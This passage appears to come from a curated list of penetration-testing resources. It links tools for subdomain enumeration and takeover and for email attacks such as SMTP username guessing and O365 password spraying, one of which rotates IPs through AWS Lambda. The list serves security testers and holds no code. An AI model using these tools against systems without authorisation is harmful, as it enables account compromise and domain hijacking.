| [Subfinder](https://github.com/projectdiscovery/subfinder) | is a subdomain discovery tool that discovers valid subdomains for websites (passive) |
| [DNSdumpster](https://dnsdumpster.com/) | is a FREE domain research tool that can discover hosts related to a domain |
| [Sublist3r](https://github.com/aboul3la/Sublist3r) | Fast subdomains enumeration tool for penetration testers |
| [SubBrute](https://github.com/TheRook/subbrute) | A DNS meta-query spider that enumerates DNS records, and subdomains |
| [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz) | list of services and how to claim (sub)domains with dangling DNS records |
| **SMTP** |
| [MXToolbox](https://mxtoolbox.com/) | this test will list MX records for a domain in priority order |
| [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) | Username guessing tool primarily for use against the default Solaris SMTP service |
| [o365spray](https://github.com/0xZDH/o365spray) | Username enumeration and password spraying tool aimed at Microsoft O365 |
| [MailSniper](https://github.com/dafthack/MailSniper) | is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms |
| [CredKing](https://github.com/ustayready/CredKing) | Password spraying using AWS Lambda for IP rotation |

